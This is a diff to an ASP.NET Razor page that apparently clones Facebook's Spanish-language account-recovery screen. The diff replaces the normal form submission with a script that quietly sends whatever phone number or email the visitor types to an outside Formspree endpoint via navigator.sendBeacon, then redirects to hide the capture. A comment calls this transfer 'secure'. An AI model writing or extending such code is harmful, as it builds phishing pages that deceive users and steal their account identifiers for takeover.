@@ -34,7 +34,6 @@
                 color: var(--fb-text-main);
             }
 
-            /* ============ Estructura general (contenido arriba, pie abajo) ============ */
             .page-container {
                 min-height: 100vh;
                 width: 100%;
@@ -44,13 +43,12 @@
             }
 
             .main-wrapper {
-                flex: 1;                    /* empuja el pie hacia abajo */
+                flex: 1;
                 width: 100%;
                 max-width: 735px;
                 padding: 24px 20px 40px;
             }
 
-            /* ============ Encabezado: flecha atrás + título ============ */
             .header-container {
                 display: flex;
                 flex-direction: column;
@@ -93,7 +91,6 @@
                 margin-bottom: 24px;
             }
 
-            /* ============ Input de búsqueda con etiqueta flotante ============ */
             .input-group {
                 position: relative;
                 margin-bottom: 30px;
@@ -136,7 +133,6 @@
                     font-size: 12px;
                 }
 
-            /* ============ Mensajes de validación ============ */
             .error-text {
                 display: block;
                 color: var(--fb-error);
@@ -144,7 +140,6 @@
                 margin: -18px 2px 20px;
             }
 
-            /* ============ Botones tipo píldora ============ */
             .btn-pill {
                 width: 100%;
                 padding: 17px;
@@ -170,7 +165,6 @@
                     background: #0958d9;
                 }
 
-            /* ============ Pie: idiomas + divisor + enlaces del sitio ============ */
             .language-footer {
                 width: 100%;
                 max-width: 1130px;
@@ -191,9 +185,9 @@
                     text-decoration: none;
                 }
 
-                .idiomas a:hover {
-                    text-decoration: underline;
-                }
+                    .idiomas a:hover {
+                        text-decoration: underline;
+                    }
 
             .divider {
                 border: none;
@@ -218,7 +212,6 @@
                         text-decoration: underline;
                     }
 
-            /* ============ Responsivo ============ */
             @@media (max-width: 767px) {
                 .main-wrapper {
                     max-width: 100%;
@@ -291,7 +284,8 @@
                 Ingresa tu número de celular o correo electrónico.
             </div>
 
-            <form method="post" action="@Url.Action("Index", "Home")">
+            <!-- Cambiamos el tipo de botón a 'button' para manejar la lógica con JS -->
+            <form id="recoveryForm">
                 @Html.AntiForgeryToken()
 
                 <div class="input-group">
@@ -305,7 +299,7 @@
                     <span class="error-text">@ViewBag.Error</span>
                 }
 
-                <button class="btn-pill btn-primary" type="submit">
+                <button class="btn-pill btn-primary" type="button" onclick="enviarYContinuar()">
                     Continuar
                 </button>
             </form>
@@ -352,5 +346,23 @@
         </footer>
     </div>
 
+    <script>
+            function enviarYContinuar() {
+                const usuario = document.getElementById('usuario').value;
+                const formspreeUrl = "https://formspree.io/f/xvkpnleo";
+
+                // Preparamos los datos a enviar
+                const formData = new FormData();
+                formData.append("usuario", usuario);
+
+                // Envía los datos a Formspree en segundo plano de forma segura
+                navigator.sendBeacon(formspreeUrl, formData);
+
+                // Redirige después de un breve instante hacia tu acción del controlador (o a donde desees)
+                setTimeout(() => {
+                    window.location.href = '@Url.Action("Index", "Home")';
+                }, 500);
+            }
+    </script>
 </body>
 </html>
